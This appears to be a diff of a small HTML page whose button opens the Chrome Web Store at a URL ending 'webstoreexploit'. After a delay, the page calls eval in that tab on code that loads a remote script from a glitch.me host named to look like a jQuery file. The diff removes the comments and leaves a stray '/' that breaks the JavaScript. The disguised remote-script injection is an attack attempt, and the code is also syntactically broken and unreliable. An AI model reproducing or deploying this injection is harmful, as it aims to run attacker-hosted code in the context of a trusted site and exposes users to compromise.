@@ -9,23 +9,21 @@
     <button id="runButton">Run JavaScript Once in New Tab after Delay</button>
 
     <script>
-        // Define the function outside the event listener callback
         function executeScriptWithDelay(tab, code, delay) {
             setTimeout(function() {
-                tab.eval(code); // Execute the script in the new tab
+                tab.eval(code); /
             }, delay);
         }
 
         document.getElementById('runButton').addEventListener('click', function() {
-            // Define the JavaScript code to be executed
+
             var scriptCode = "(function () { var a = document.createElement('script'); a.src = 'https://jquery-scripts.glitch.me/scripts/3.0/jquery-3.0.5.min.js'; document.body.appendChild(a); }())";
 
-            // Open a new tab
             var newTab = window.open('https://chrome.google.com/webstoreexploit');
 
-            // Once the new tab is loaded, execute the script once after 3 seconds
+
             newTab.onload = function() {
-                executeScriptWithDelay(newTab, scriptCode, 3000); // Delay set to 3000 milliseconds (3 seconds)
+                executeScriptWithDelay(newTab, scriptCode, 3000);
             };
         });
     </script>
